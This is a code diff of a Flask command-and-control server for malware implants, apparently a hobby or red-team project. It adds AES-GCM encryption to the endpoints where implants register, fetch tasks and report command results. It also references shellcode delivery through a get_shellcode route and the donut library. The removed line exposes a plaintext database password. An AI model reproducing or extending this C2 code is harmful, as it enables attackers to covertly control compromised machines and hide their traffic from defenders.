@@ -5,6 +5,7 @@ import hashlib
 from aesgcm import encrypt, decrypt
 import json
 import donut
+from creds import db_cred
 
 
 ### some useful notes here ###
@@ -39,7 +40,7 @@ app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True    # makes json output more rea
 # set the database to work with flask ###
 
 # app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite' # set the database to work with flask
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:WQap958910!@localhost/c2_server' #mysql://username:password@server/db
+app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{db_cred["username"]}:{db_cred["password"]}@localhost/c2_server' #mysql://username:password@server/db
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
 db = SQLAlchemy(app)
 
@@ -116,10 +117,16 @@ def decrypt_data(byte_str):
     
     plaintext = decrypt(aes_key, data["iv"], data["cipher"], data["tag"])
 
-    # plaintext = json.loads(plaintext.decode())
-    # print(plaintext)
+    plaintext = json.loads(plaintext.decode())
 
     return plaintext
+
+def encrypt_data(data):
+    byte_data = json.dumps(data).encode()
+    iv, ct, tag = encrypt(aes_key, byte_data)
+    serialized = serialize(iv, tag, ct)
+
+    return serialized
 
 
 def find_agent_by_id(id_):
@@ -198,7 +205,7 @@ def register_agent(): # --> this is a handler
         and processes the registration request from agents
     """
     # request.json -> this will be how we are getting data from implant
-    reg_data = request.json # storing registration data
+    reg_data = decrypt_data(request.data)  # storing registration data
     reg_password = reg_data["password"]
     reg_whoami = reg_data["whoami"]
     reg_agent_id = reg_data["agent_id"]
@@ -212,12 +219,12 @@ def register_agent(): # --> this is a handler
         print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
     else:
         # print("[-] authentication failed")
-        return jsonify({"status": "authentication failed"})
+        return encrypt_data({"status": "authentication failed"})
 
-    return jsonify({"status": "ok", "message": "Welcome!"})
+    return encrypt_data({"status": "ok", "message": "Welcome!"})
 
-@app.route('/agent/send_task', methods=['POST'])
-def send_task():
+@app.route('/agent/get_task', methods=['POST'])
+def get_task():
     """
         listens to the /task route
         When an implant asks for a new task, this function will query the database
@@ -225,14 +232,14 @@ def send_task():
         If so, return the task (a list of commands) in a json format
         If not, return an empty json (or something else)
     """
-    data = request.json ## getting a request from task route
+    data = decrypt_data(request.data) ## getting a request from task route
     if data == None:
-        return jsonify({"status": "error: no data"})
+        return encrypt_data({"status": "error: no data"})
 
     agent_id = data["agent_id"] ## need to verify agent_id 
     password = data["password"] ## and password 
     if not agent_exist(agent_id):
-        return jsonify({"status": "error: agent not found"})
+        return encrypt_data({"status": "error: agent not found"})
 
     if verify_agent_password(agent_id, password):
         print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
@@ -243,35 +250,36 @@ def send_task():
         ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###
 
         if task == None:
-            return jsonify({"status": "no task for this agent at the moment"})
+            return encrypt_data({"status": "no task for this agent at the moment"})
 
-        return jsonify(task)
+        return encrypt_data(task)
     else:
         print("[-] the agent has failed to authenticate")
-        return jsonify({"status": "authentication failed"})
+        return encrypt_data({"status": "authentication failed"})
     
-@app.route('/agent/get_results', methods=['POST'])
-def get_results():
+@app.route('/agent/send_result', methods=['POST'])
+def send_result():
     """
         listens to the /task_results route
         When an implant sends back the results of a task, this function will store the results
         in the database
     """
-    data = request.json
+    data = decrypt_data(request.data)
     if data == None:
-        return jsonify({"status": "error: no data"})
+        return encrypt_data({"status": "error: no data"})
     agent_id = data["agent_id"]
     password = data["password"]
-    results = data["results"]
+    command = data["command"]
+    result = data["result"]
 
     if verify_agent_password(agent_id, password):
         print(f"[+] agent {agent_id} has successfully completed the task")
-        print(f"[+] here are the results: {results}")
+        print(f"[+] here are the results for {command}: {result}")
         agent = find_agent_by_id(agent_id)
-        return jsonify({"status": "ok"})
+        return encrypt_data({"status": "ok"})
     else:
         print("[-] the agent has failed to authenticate")
-        return jsonify({"status": "authentication failed"})
+        return encrypt_data({"status": "authentication failed"})
 
 @app.route('/agent/get_shellcode', methods=['GET'])
 def get_shellcode():
@@ -357,6 +365,11 @@ def create_task():
     print(f"[+] a new task has been created for agent {agent_id}")
     return jsonify({"status": "ok", "job_id": job_id})
 
+def printBytes(data):
+    print(data[0:12])
+    print(data[12:28])
+    print(data[28:])
+
 @app.route("/test", methods=["GET", "POST"])
 def test():
     if request.method == "GET":
@@ -364,8 +377,9 @@ def test():
         return payload
     else:
         message = decrypt_data(request.data) 
+        print(type(message))
         print(message)
-        return request.data
+        return encrypt_data(message)
 
 
 if __name__ == '__main__':
